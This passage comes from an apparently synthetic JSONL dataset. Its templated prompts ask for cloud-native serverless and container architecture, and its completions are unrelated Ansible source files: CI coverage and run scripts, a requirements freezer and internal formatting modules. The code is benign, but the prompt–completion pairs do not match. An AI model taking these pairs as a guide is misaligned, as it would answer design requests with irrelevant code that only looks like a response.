run['id'],\n                run['finishedDate']))\n        else:\n            print('😢 [%s] https://dev.azure.com/ansible/ansible/_build/results?buildId=%s (%s)' % (\n                stringc('FAIL', 'red'),\n                run['id'],\n                run['finishedDate']))\n\n    if in_progress:\n        print('The following runs are ongoing:')\n        for run in in_progress:\n            print('🤔 [%s] https://dev.azure.com/ansible/ansible/_build/results?buildId=%s' % (\n                stringc('FATE', 'yellow'),\n                run['id']))\n\n\ndef main():\n    pretty_coverage_runs(get_coverage_runs())\n\n\nif __name__ == '__main__':\n    main()\n", "metadata": {"source": "github.com/ansible/ansible", "file_path": "hacking/azp/get_recent_coverage_runs.py", "language": "python", "complexity": "medium", "star_count": 65718, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 115}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design cloud-native architecture with serverless and container patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python\n# PYTHON_ARGCOMPLETE_OK\n\n# (c) 2020 Red Hat, Inc.\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\n\"\"\"CLI tool for reporting on incidental test coverage.\"\"\"\nfrom __future__ import annotations\n\n# noinspection PyCompatibility\nimport argparse\nimport glob\nimport json\nimport os\nimport re\nimport subprocess\nimport sys\nimport hashlib\n\ntry:\n    # noinspection PyPackageRequirements\n    import argcomplete\nexcept ImportError:\n    argcomplete = None\n\n# Following changes should be made to improve the overall style:\n# TODO use new style formatting method.\n# TODO type hints.\n# TODO pathlib.\n\n\ndef main():\n    \"\"\"Main program body.\"\"\"\n    args = parse_args()\n\n    try:\n        incidental_report(args)\n    except ApplicationError as ex:\n        sys.exit(ex)\n\n\ndef parse_args():\n    \"\"\"Parse and return args.\"\"\"\n    source = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))\n\n    parser = argparse.ArgumentParser(description='Report on incidental test coverage downloaded from Azure Pipelines.')\n\n    parser.add_argument('result',\n                        type=directory,\n                        help='path to directory containing test results downloaded from Azure Pipelines')\n\n    parser.add_argument('--output',\n                        type=optional_directory,\n                        default=os.path.join(source, 'test', 'results', '.tmp', 'incidental'),\n                        help='path to directory where reports should be written')\n\n    parser.add_argument('--source',\n                        type=optional_directory,\n                        default=source,\n                        help='path to git repository containing Ansible source')\n\n    parser.add_argument('--skip-checks',\n                        action='store_true',\n                        help='skip integrity checks, use only for debugging')\n\n    parser.add_argument('--ignore-cache',\n                        dest='use_cache',\n                        action='store_false',\n                        help='ignore cached files')\n\n    parser.add_argument('-v', '--verbose',\n                        action='store_true',\n                        help='increase verbosity')\n\n    parser.add_argument('--result-sha',\n                        default=None,\n                        help='Override the result sha')\n\n    targets = parser.add_mutually_exclusive_group()\n\n    targets.add_argument('--targets',\n                         type=regex,\n                         default='^incidental_',\n                         help='regex for targets to analyze, default: %(default)s')\n\n    targets.add_argument('--plugin-path',\n                         help='path to plugin to report incidental coverage on')\n\n    if argcomplete:\n        argcomplete.autocomplete(parser)\n\n    args = parser.parse_args()\n\n    return args\n\n\ndef optional_directory(value):\n    if not os.path.exists(value):\n        return value\n\n    return directory(value)\n\n\ndef directory(value):\n    if not os.path.isdir(value):\n        raise argparse.ArgumentTypeError('\"%s\" is not a directory' % value)\n\n    return value\n\n\ndef regex(value):\n    try:\n        return re.compile(value)\n    except Exception as ex:\n        raise argparse.ArgumentTypeError('\"%s\" is not a valid regex: %s' % (value, ex))\n\n\ndef incidental_report(args):\n    \"\"\"Generate incidental coverage report.\"\"\"\n    ct = CoverageTool()\n    git = Git(os.path.abspath(args.source))\n    coverage_data = CoverageData(os.path.abspath(args.result))\n\n    result_sha = args.result_sha or coverage_data.result_sha\n\n    try:\n        git.show([result_sha, '--'])\n    except subprocess.CalledProcessError:\n        raise ApplicationError('%s: commit not found: %s\\n'\n                               'make sure your source repository is up-to-date' % (git.path, result_sha))\n\n    if coverage_data.result != \"succeeded\":\n        check_failed(args, 'results indicate tests did not pass (result: %s)\\n'\n                           're-run until passing, then download the latest results and re-run the report using those results' % coverage_data.result)\n\n    if not coverage_data.paths:\n        raise ApplicationError('no coverage data found\\n'\n                               'make sure the downloaded results are from a code coverage run on Azure Pipelines')\n\n    # generate a unique subdirectory in the output directory based on the input files being used\n    path_hash = hashlib.sha256(b'\\n'.join(p.encode() for p in coverage_data.paths)).hexdigest()\n    output_path = os.path.abspath(os.path.join(args.output, path_hash))\n\n    data_path = os.path.join(output_path, 'data')\n    reports_path = os.path.join(output_path, 'reports')\n\n    for path in [data_path, reports_path]:\n        if not os.path.exists(path):\n            os.makedirs(path)\n\n    # combine coverage results into a single file\n    combined_path = os.path.join(output_path, 'combined.json')\n    cached(combined_path, args.use_cache, args.verbose,\n           lambda: ct.combine(coverage_data.paths, combined_path))\n\n    with open(combined_path) as combined_file:\n        combined = json.load(combined_file)\n\n    if args.plugin_path:\n        # reporting on coverage missing from the test target for the specified plugin\n        # the report will be on a single target\n        cache_path_format = '%s' + '-for-%s' % os.path.splitext(os.path.basename(args.plugin_path))[0]\n        target_pattern = '^%s$' % get_target_name_from_plugin_path(args.plugin_path)\n        include_path = args.plugin_path\n        missing = True\n        target_name = get_target_name_from_plugin_path(args.plugin_path)\n    else:\n        # reporting on coverage exclusive to the matched targets\n        # the report can contain multiple targets\n        cache_path_format = '%s'\n        target_pattern = args.targets\n        include_path = None\n        missing = False\n        target_name = None\n\n    # identify integration test targets to analyze\n    target_names = sorted(combined['targets'])\n    incidental_target_names = [target for target in target_names if re.search(target_pattern, target)]\n\n    if not incidental_target_names:\n        if target_name:\n            # if the plugin has no tests we still want to know what coverage is missing\n            incidental_target_names = [target_name]\n        else:\n            raise ApplicationError('no targets to analyze')\n\n    # exclude test support plugins from analysis\n    # also exclude six, which for an unknown reason reports bogus coverage lines (indicating coverage of comments)\n    exclude_path = '^(test/support/|lib/ansible/module_utils/six/)'\n\n    # process coverage for each target and then generate a report\n    # save sources for generating a summary report at the end\n    summary = {}\n    report_paths = {}\n\n    for target_name in incidental_target_names:\n        cache_name = cache_path_format % target_name\n\n        only_target_path = os.path.join(data_path, 'only-%s.json' % cache_name)\n        cached(only_target_path, args.use_cache, args.verbose,\n               lambda: ct.filter(combined_path, only_target_path, include_targets=[target_name], include_path=include_path, exclude_path=exclude_path))\n\n        without_target_path = os.path.join(data_path, 'without-%s.json' % cache_name)\n        cached(without_target_path, args.use_cache, args.verbose,\n               lambda: ct.filter(combined_path, without_target_path, exclude_targets=[target_name], include_path=include_path, exclude_path=exclude_path))\n\n        if missing:\n            source_target_path = missing_target_path = os.path.join(data_path, 'missing-%s.json' % cache_name)\n            cached(missing_target_path, args.use_cache, args.verbose,\n                   lambda: ct.missing(without_target_path, only_target_path, missing_target_path, only_gaps=True))\n        else:\n            source_target_path = exclusive_target_path = os.path.join(data_path, 'exclusive-%s.json' % cache_name)\n            cached(exclusive_target_path, args.use_cache, args.verbose,\n                   lambda: ct.missing(only_target_path, without_target_path, exclusive_target_path, only_gaps=True))\n\n        source_expanded_target_path = os.path.join(os.path.dirname(source_target_path), 'expanded-%s' % os.path.basename(source_target_path))\n        cached(source_expanded_target_path, args.use_cache, args.verbose,\n               lambda: ct.expand(source_target_path, source_expanded_target_path))\n\n        summary[target_name] = sources = collect_sources(source_expanded_target_path, git, coverage_data, result_sha)\n\n        txt_report_path = os.path.join(reports_path, '%s.txt' % cache_name)\n        cached(txt_report_path, args.use_cache, args.verbose,\n               lambda: generate_report(sources, txt_report_path, coverage_data, target_name, missing=missing))\n\n        report_paths[target_name] = txt_report_path\n\n    # provide a summary report of results\n    for target_name in incidental_target_names:\n        sources = summary[target_name]\n        report_path = os.path.relpath(report_paths[target_name])\n\n        print('%s: %d arcs, %d lines, %d files - %s' % (\n            target_name,\n            sum(len(s.covered_arcs) for s in sources),\n            sum(len(s.covered_lines) for s in sources),\n            len(sources),\n            report_path,\n        ))\n\n    if not missing:\n        sys.stderr.write('NOTE: This report shows only coverage exclusive to the reported targets. '\n                         'As targets are removed, exclusive coverage on the remaining targets will increase.\\n')\n\n\ndef get_target_name_from_plugin_path(path):  # type: (str) -> str\n    \"\"\"Return the integration test target name for the given plugin path.\"\"\"\n    parts = os.path.splitext(path)[0].split(os.path.sep)\n    plugin_name = parts[-1]\n\n    if path.startswith('lib/ansible/modules/'):\n        plugin_type = None\n    elif path.startswith('lib/ansible/plugins/'):\n        plugin_type = parts[3]\n    elif path.startswith('lib/ansible/module_utils/'):\n        plugin_type = parts[2]\n    elif path.startswith('plugins/'):\n        plugin_type = parts[1]\n    else:\n        raise ApplicationError('Cannot determine plugin type from plugin path: %s' % path)\n\n    if plugin_type is None:\n        target_name = plugin_name\n    else:\n        target_name = '%s_%s' % (plugin_type, plugin_name)\n\n    return target_name\n\n\nclass CoverageData:\n    def __init__(self, result_path):\n        with open(os.path.join(result_path, 'run.json')) as run_file:\n            run = json.load(run_file)\n\n        self.result_sha = run[\"resources\"][\"repositories\"][\"self\"][\"version\"]\n        self.result = run['result']\n\n        self.github_base_url = 'https://github.com/ansible/ansible/blob/%s/' % self.result_sha\n\n        # locate available results\n        self.paths = sorted(glob.glob(os.path.join(result_path, '*', 'coverage-analyze-targets.json')))\n\n\nclass Git:\n    def __init__(self, path):\n        self.git = 'git'\n        self.path = path\n\n        try:\n            self.show()\n        except subprocess.CalledProcessError:\n            raise ApplicationError('%s: not a git repository' % path)\n\n    def show(self, args=None):\n        return self.run(['show'] + (args or []))\n\n    def run(self, command):\n        return subprocess.check_output([self.git] + command, cwd=self.path)\n\n\nclass CoverageTool:\n    def __init__(self):\n        self.analyze_cmd = ['ansible-test', 'coverage', 'analyze', 'targets']\n\n    def combine(self, input_paths, output_path):\n        subprocess.check_call(self.analyze_cmd + ['combine'] + input_paths + [output_path])\n\n    def filter(self, input_path, output_path, include_targets=None, exclude_targets=None, include_path=None, exclude_path=None):\n        args = []\n\n        if include_targets:\n            for target in include_targets:\n                args.extend(['--include-target', target])\n\n        if exclude_targets:\n            for target in exclude_targets:\n                args.extend(['--exclude-target', target])\n\n        if include_path:\n            args.extend(['--include-path', include_path])\n\n        if exclude_path:\n            args.extend(['--exclude-path', exclude_path])\n\n        subprocess.check_call(self.analyze_cmd + ['filter', input_path, output_path] + args)\n\n    def missing(self, from_path, to_path, output_path, only_gaps=False):\n        args = []\n\n        if only_gaps:\n            args.append('--only-gaps')\n\n        subprocess.check_call(self.analyze_cmd + ['missing', from_path, to_path, output_path] + args)\n\n    def expand(self, input_path, output_path):\n        subprocess.check_call(self.analyze_cmd + ['expand', input_path, output_path])\n\n\nclass SourceFile:\n    def __init__(self, path, source, coverage_data, coverage_points):\n        self.path = path\n        self.lines = source.decode().splitlines()\n        self.coverage_data = coverage_data\n        self.coverage_points = coverage_points\n        self.github_url = coverage_data.github_base_url + path\n\n        is_arcs = ':' in dict(coverage_points).popitem()[0]\n\n        if is_arcs:\n            parse = parse_arc\n        else:\n            parse = int\n\n        self.covered_points = set(parse(v) for v in coverage_points)\n        self.covered_arcs = self.covered_points if is_arcs else None\n        self.covered_lines = set(abs(p[0]) for p in self.covered_points) | set(abs(p[1]) for p in self.covered_points)\n\n\ndef collect_sources(data_path, git, coverage_data, result_sha):\n    with open(data_path) as data_file:\n        data = json.load(data_file)\n\n    sources = []\n\n    for path_coverage in data.values():\n        for path, path_data in path_coverage.items():\n            sources.append(SourceFile(path, git.show(['%s:%s' % (result_sha, path)]), coverage_data, path_data))\n\n    return sources\n\n\ndef generate_report(sources, report_path, coverage_data, target_name, missing):\n    output = [\n        'Target: %s (%s coverage)' % (target_name, 'missing' if missing else 'exclusive'),\n        'GitHub: %stest/integration/targets/%s' % (coverage_data.github_base_url, target_name),\n    ]\n\n    for source in sources:\n        if source.covered_arcs:\n            output.extend([\n                '',\n                'Source: %s (%d arcs, %d/%d lines):' % (source.path, len(source.covered_arcs), len(source.covered_lines), len(source.lines)),\n                'GitHub: %s' % source.github_url,\n                '',\n            ])\n        else:\n            output.extend([\n                '',\n                'Source: %s (%d/%d lines):' % (source.path, len(source.covered_lines), len(source.lines)),\n                'GitHub: %s' % source.github_url,\n                '',\n            ])\n\n        last_line_no = 0\n\n        for line_no, line in enumerate(source.lines, start=1):\n            if line_no not in source.covered_lines:\n                continue\n\n            if last_line_no and last_line_no != line_no - 1:\n                output.append('')\n\n            notes = ''\n\n            if source.covered_arcs:\n                from_lines = sorted(p[0] for p in source.covered_points if abs(p[1]) == line_no)\n                to_lines = sorted(p[1] for p in source.covered_points if abs(p[0]) == line_no)\n\n                if from_lines:\n                    notes += '  ### %s -> (here)' % ', '.join(str(from_line) for from_line in from_lines)\n\n                if to_lines:\n                    notes += '  ### (here) -> %s' % ', '.join(str(to_line) for to_line in to_lines)\n\n            output.append('%4d  %s%s' % (line_no, line, notes))\n            last_line_no = line_no\n\n    with open(report_path, 'w') as report_file:\n        report_file.write('\\n'.join(output) + '\\n')\n\n\ndef parse_arc(value):\n    return tuple(int(v) for v in value.split(':'))\n\n\ndef cached(path, use_cache, show_messages, func):\n    if os.path.exists(path) and use_cache:\n        if show_messages:\n            sys.stderr.write('%s: cached\\n' % path)\n            sys.stderr.flush()\n        return\n\n    if show_messages:\n        sys.stderr.write('%s: generating ... ' % path)\n        sys.stderr.flush()\n\n    func()\n\n    if show_messages:\n        sys.stderr.write('done\\n')\n        sys.stderr.flush()\n\n\ndef check_failed(args, message):\n    if args.skip_checks:\n        sys.stderr.write('WARNING: %s\\n' % message)\n        return\n\n    raise ApplicationError(message)\n\n\nclass ApplicationError(Exception):\n    pass\n\n\nif __name__ == '__main__':\n    main()\n", "metadata": {"source": "github.com/ansible/ansible", "file_path": "hacking/azp/incidental.py", "language": "python", "complexity": "complex", "star_count": 65718, "quality_score": 0.98, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 471}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design cloud-native architecture with serverless and container patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python\n# PYTHON_ARGCOMPLETE_OK\n\n# (c) 2016 Red Hat, Inc.\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\n\n\"\"\"CLI tool for starting new CI runs.\"\"\"\n\nfrom __future__ import annotations\n\n# noinspection PyCompatibility\nimport argparse\nimport json\nimport os\nimport sys\nimport requests\nimport requests.auth\n\ntry:\n    import argcomplete\nexcept ImportError:\n    argcomplete = None\n\n# TODO: Dev does not have a token for AZP, somebody please test this.\n\n# Following changes should be made to improve the overall style:\n# TODO use new style formatting method.\n# TODO type hints.\n\n\ndef main():\n    \"\"\"Main program body.\"\"\"\n\n    args = parse_args()\n\n    key = os.environ.get('AZP_TOKEN', None)\n    if not key:\n        sys.stderr.write(\"please set you AZP token in AZP_TOKEN\")\n        sys.exit(1)\n\n    start_run(args, key)\n\n\ndef parse_args():\n    \"\"\"Parse and return args.\"\"\"\n\n    parser = argparse.ArgumentParser(description='Start a new CI run.')\n\n    parser.add_argument('-p', '--pipeline-id', type=int, default=20, help='pipeline to download the job from')\n    parser.add_argument('--ref', help='git ref name to run on')\n\n    parser.add_argument('--env',\n                        nargs=2,\n                        metavar=('KEY', 'VALUE'),\n                        action='append',\n                        help='environment variable to pass')\n\n    if argcomplete:\n        argcomplete.autocomplete(parser)\n\n    args = parser.parse_args()\n\n    return args\n\n\ndef start_run(args, key):\n    \"\"\"Start a new CI run.\"\"\"\n\n    url = \"https://dev.azure.com/ansible/ansible/_apis/pipelines/%s/runs?api-version=6.0-preview.1\" % args.pipeline_id\n    payload = {\"resources\": {\"repositories\": {\"self\": {\"refName\": args.ref}}}}\n\n    resp = requests.post(url, auth=requests.auth.HTTPBasicAuth('user', key), data=payload)\n    resp.raise_for_status()\n\n    print(json.dumps(resp.json(), indent=4, sort_keys=True))\n\n\nif __name__ == '__main__':\n    main()\n", "metadata": {"source": "github.com/ansible/ansible", "file_path": "hacking/azp/run.py", "language": "python", "complexity": "simple", "star_count": 65718, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 94}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design cloud-native architecture with serverless and container patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python\n# PYTHON_ARGCOMPLETE_OK\n\"\"\"Generate frozen sanity test requirements from source requirements files.\"\"\"\n\nfrom __future__ import annotations\n\nimport argparse\nimport dataclasses\nimport pathlib\nimport re\nimport subprocess\nimport tempfile\nimport typing as t\nimport venv\n\nimport packaging.version\nimport packaging.specifiers\nimport packaging.requirements\n\ntry:\n    import argcomplete\nexcept ImportError:\n    argcomplete = None\n\n\nFILE = pathlib.Path(__file__).resolve()\nROOT = FILE.parent.parent\nSELF = FILE.relative_to(ROOT)\n\n\n@dataclasses.dataclass(frozen=True)\nclass SanityTest:\n    name: str\n    requirements_path: pathlib.Path\n    source_path: pathlib.Path\n\n    def freeze_requirements(self) -> None:\n        source_requirements = [packaging.requirements.Requirement(re.sub(' #.*$', '', line)) for line in self.source_path.read_text().splitlines()]\n\n        install_packages = {requirement.name for requirement in source_requirements}\n        exclude_packages = {'distribute', 'pip', 'setuptools', 'wheel'} - install_packages\n\n        with tempfile.TemporaryDirectory() as venv_dir:\n            venv.create(venv_dir, with_pip=True)\n\n            python = pathlib.Path(venv_dir, 'bin', 'python')\n            pip = [python, '-m', 'pip', '--disable-pip-version-check']\n            env = dict()\n\n            pip_freeze = subprocess.run(pip + ['freeze'], env=env, check=True, capture_output=True, text=True)\n\n            if pip_freeze.stdout:\n                raise Exception(f'Initial virtual environment is not empty:\\n{pip_freeze.stdout}')\n\n            subprocess.run(pip + ['install', '-r', self.source_path], env=env, check=True)\n\n            freeze_options = ['--all']\n\n            for exclude_package in exclude_packages:\n                freeze_options.extend(('--exclude', exclude_package))\n\n            pip_freeze = subprocess.run(pip + ['freeze'] + freeze_options, env=env, check=True, capture_output=True, text=True)\n\n        self.write_requirements(pip_freeze.stdout)\n\n    def update_pre_build(self) -> None:\n        \"\"\"Update requirements in place with current pre-build instructions.\"\"\"\n        requirements = pathlib.Path(self.requirements_path).read_text()\n        lines = requirements.splitlines(keepends=True)\n        lines = [line for line in lines if not line.startswith('#')]\n        requirements = ''.join(lines)\n\n        self.write_requirements(requirements)\n\n    def write_requirements(self, requirements: str) -> None:\n        \"\"\"Write the given test requirements to the requirements file for this test.\"\"\"\n        pre_build = pre_build_instructions(requirements)\n\n        requirements = f'# edit \"{self.source_path.name}\" and generate with: {SELF} --test {self.name}\\n{pre_build}{requirements}'\n\n        with open(self.requirements_path, 'w') as requirement_file:\n            requirement_file.write(requirements)\n\n    @staticmethod\n    def create(path: pathlib.Path) -> SanityTest:\n        return SanityTest(\n            name=path.stem.replace('sanity.', '').replace('.requirements', ''),\n            requirements_path=path,\n            source_path=path.with_suffix('.in'),\n        )\n\n\ndef pre_build_instructions(requirements: str) -> str:\n    \"\"\"Parse the given requirements and return any applicable pre-build instructions.\"\"\"\n    parsed_requirements = requirements.splitlines()\n\n    package_versions = {\n        match.group('package').lower(): match.group('version') for match\n        in (re.search('^(?P<package>.*)==(?P<version>.*)$', requirement) for requirement in parsed_requirements)\n        if match\n    }\n\n    instructions: list[str] = []\n\n    build_constraints = (\n        ('pyyaml', '>= 5.4, <= 6.0', ('Cython < 3.0',)),\n    )\n\n    for package, specifier, constraints in build_constraints:\n        version_string = package_versions.get(package)\n\n        if version_string:\n            version = packaging.version.Version(version_string)\n            specifier_set = packaging.specifiers.SpecifierSet(specifier)\n\n            if specifier_set.contains(version):\n                instructions.append(f'# pre-build requirement: {package} == {version}\\n')\n\n                for constraint in constraints:\n                    instructions.append(f'# pre-build constraint: {constraint}\\n')\n\n    return ''.join(instructions)\n\n\ndef main() -> None:\n    tests = find_tests()\n\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\n        '--test',\n        metavar='TEST',\n        dest='test_names',\n        action='append',\n        choices=[test.name for test in tests],\n        help='test requirements to update'\n    )\n\n    parser.add_argument(\n        '--pre-build-only',\n        action='store_true',\n        help='apply pre-build instructions to existing requirements',\n    )\n\n    if argcomplete:\n        argcomplete.autocomplete(parser)\n\n    args = parser.parse_args()\n    test_names: set[str] = set(args.test_names or [])\n\n    tests = [test for test in tests if test.name in test_names] if test_names else tests\n\n    for test in tests:\n        print(f'===[ {test.name} ]===', flush=True)\n\n        if args.pre_build_only:\n            test.update_pre_build()\n        else:\n            test.freeze_requirements()\n\n\ndef find_tests() -> t.List[SanityTest]:\n    globs = (\n        'test/lib/ansible_test/_data/requirements/sanity.*.txt',\n        'test/sanity/code-smell/*.requirements.txt',\n    )\n\n    tests: t.List[SanityTest] = []\n\n    for glob in globs:\n        tests.extend(get_tests(pathlib.Path(glob)))\n\n    return sorted(tests, key=lambda test: test.name)\n\n\ndef get_tests(glob: pathlib.Path) -> t.List[SanityTest]:\n    path = pathlib.Path(ROOT, glob.parent)\n    pattern = glob.name\n\n    return [SanityTest.create(item) for item in path.glob(pattern)]\n\n\nif __name__ == '__main__':\n    main()\n", "metadata": {"source": "github.com/ansible/ansible", "file_path": "hacking/update-sanity-requirements.py", "language": "python", "complexity": "medium", "star_count": 65718, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 184}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design cloud-native architecture with serverless and container patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from __future__ import annotations\n\nimport importlib\nimport typing as t\n\nfrom ansible.module_utils import _internal\nfrom ansible.module_utils._internal._json import _profiles\n\n\ndef get_controller_serialize_map() -> dict[type, t.Callable]:\n    \"\"\"\n    Injected into module_utils code to augment serialization maps with controller-only types.\n    This implementation replaces the no-op version in module_utils._internal in controller contexts.\n    \"\"\"\n    from ansible._internal._templating import _lazy_containers\n    from ansible.parsing.vault import EncryptedString\n\n    return {\n        _lazy_containers._AnsibleLazyTemplateDict: _profiles._JSONSerializationProfile.discard_tags,\n        _lazy_containers._AnsibleLazyTemplateList: _profiles._JSONSerializationProfile.discard_tags,\n        EncryptedString: str,  # preserves tags since this is an instance of EncryptedString; if tags should be discarded from str, another entry will handle it\n    }\n\n\ndef import_controller_module(module_name: str, /) -> t.Any:\n    \"\"\"\n    Injected into module_utils code to import and return the specified module.\n    This implementation replaces the no-op version in module_utils._internal in controller contexts.\n    \"\"\"\n    return importlib.import_module(module_name)\n\n\n_T = t.TypeVar('_T')\n\n\ndef experimental(obj: _T) -> _T:\n    \"\"\"\n    Decorator for experimental types and methods outside the `_internal` package which accept or expose internal types.\n    As with internal APIs, these are subject to change at any time without notice.\n    \"\"\"\n    return obj\n\n\ndef setup() -> None:\n    \"\"\"No-op function to ensure that side-effect only imports of this module are not flagged/removed as 'unused'.\"\"\"\n\n\n# DTFIX-FUTURE: this is really fragile- disordered/incorrect imports (among other things) can mess it up. Consider a hosting-env-managed context\n#  with an enum with at least Controller/Target/Unknown values, and possibly using lazy-init module shims or some other mechanism to allow controller-side\n#  notification/augmentation of this kind of metadata.\n_internal.get_controller_serialize_map = get_controller_serialize_map\n_internal.import_controller_module = import_controller_module\n_internal.is_controller = True\n", "metadata": {"source": "github.com/ansible/ansible", "file_path": "lib/ansible/_internal/__init__.py", "language": "python", "complexity": "simple", "star_count": 65718, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 54}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design cloud-native architecture with serverless and container patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from __future__ import annotations as _annotations\n\nimport collections.abc as _c\nimport textwrap as _textwrap\n\nfrom ansible.module_utils._internal import _event_utils, _messages\n\n\ndef format_event(event: _messages.Event, include_traceback: bool) -> str:\n    \"\"\"Format an event into a verbose message and traceback.\"\"\"\n    msg = format_event_verbose_message(event)\n\n    if include_traceback:\n        msg += '\\n' + format_event_traceback(event)\n\n    msg = msg.strip()\n\n    if '\\n' in msg:\n        msg += '\\n\\n'\n    else:\n        msg += '\\n'\n\n    return msg\n\n\ndef format_event_traceback(event: _messages.Event) -> str:\n    \"\"\"Format an event into a traceback.\"\"\"\n    segments: list[str] = []\n\n    while event:\n        segment = event.formatted_traceback or '(traceback missing)\\n'\n\n        if event.events:\n            child_tracebacks = [format_event_traceback(child) for child in event.events]\n            segment += _format_event_children(\"Sub-Traceback\", child_tracebacks)\n\n        segments.append(segment)\n\n        if event.chain:\n            segments.append(f'\\n{event.chain.traceback_reason}\\n\\n')\n\n            event = event.chain.event\n        else:\n            event = None\n\n    return ''.join(reversed(segments))\n\n\ndef format_event_verbose_message(event: _messages.Event) -> str:\n    \"\"\"\n    Format an event into a verbose message.\n    Help text, contextual information and sub-events will be included.\n    \"\"\"\n    segments: list[str] = []\n    original_event = event\n\n    while event:\n        messages = [event.msg]\n        chain: _messages.EventChain = event.chain\n\n        while chain and chain.follow:\n            if chain.event.events:\n                break  # do not collapse a chained event with sub-events, since they would be lost\n\n            if chain.event.formatted_source_context or chain.event.help_text:\n                if chain.event.formatted_source_context != event.formatted_source_context or chain.event.help_text != event.help_text:\n                    break  # do not collapse a chained event with different details, since they would be lost\n\n            if chain.event.chain and chain.msg_reason != chain.event.chain.msg_reason:\n                break  # do not collapse a chained event which has a chain with a different msg_reason\n\n            messages.append(chain.event.msg)\n\n            chain = chain.event.chain\n\n        msg = _event_utils.deduplicate_message_parts(messages)\n        segment = '\\n'.join(_get_message_lines(msg, event.help_text, event.formatted_source_context)) + '\\n'\n\n        if event.events:\n            child_msgs = [format_event_verbose_message(child) for child in event.events]\n            segment += _format_event_children(\"Sub-Event\", child_msgs)\n\n        segments.append(segment)\n\n        if chain and chain.follow:\n            segments.append(f'\\n{chain.msg_reason}\\n\\n')\n\n            event = chain.event\n        else:\n            event = None\n\n    if len(segments) > 1:\n        segments.insert(0, _event_utils.format_event_brief_message(original_event) + '\\n\\n')\n\n    return ''.join(segments)\n\n\ndef _format_event_children(label: str, children: _c.Iterable[str]) -> str:\n    \"\"\"Format the given list of child messages into a single string.\"\"\"\n    items = list(children)\n    count = len(items)\n    lines = ['\\n']\n\n    for idx, item in enumerate(items):\n        lines.append(f'+--[ {label} {idx + 1} of {count} ]---\\n')\n        lines.append(_textwrap.indent(f\"\\n{item}\\n\", \"| \", lambda value: True))\n\n    lines.append(f'+--[ End {label} ]---\\n')\n\n    return ''.join(lines)\n\n\ndef _get_message_lines(message: str, help_text: str | None, formatted_source_context: str | None) -> list[str]:\n    \"\"\"Return a list of message lines constructed from the given message, help text and formatted source context.\"\"\"\n    if help_text and not formatted_source_context and '\\n' not in message and '\\n' not in help_text:\n        return [f'{message} {help_text}']  # prefer a single-line message with help text when there is no source context\n\n    message_lines = [message]\n\n    if formatted_source_context:\n        message_lines.append(formatted_source_context)\n\n    if help_text:\n        message_lines.append('')\n        message_lines.append(help_text)\n\n    return message_lines\n", "metadata": {"source": "github.com/ansible/ansible", "file_path": "lib/ansible/_internal/_event_formatting.py", "language": "python", "complexity": "medium", 